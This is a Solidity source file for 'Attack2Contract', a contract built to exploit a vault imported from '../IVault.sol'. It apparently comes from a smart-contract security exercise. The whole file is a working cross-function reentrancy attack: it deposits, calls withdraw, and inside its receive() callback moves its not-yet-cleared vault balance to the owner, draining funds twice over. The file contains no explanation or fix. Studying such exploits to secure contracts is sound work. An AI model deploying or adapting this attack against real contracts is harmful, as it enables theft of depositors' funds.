// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "../IVault.sol";

contract Attack2Contract {
    address victim;
    address owner;

    constructor(address _victim, address _owner) {
        victim = _victim;
        owner = _owner;
    }

    function deposit() external payable {
        IVault(victim).deposit{value: msg.value} ();
    }  

    function withdraw() external {
        IVault(victim).withdraw();
    }

    receive() external payable {
        uint256 balance = IVault(victim).balances(address(this));
        IVault(victim).transfer(owner, balance);
    } 
}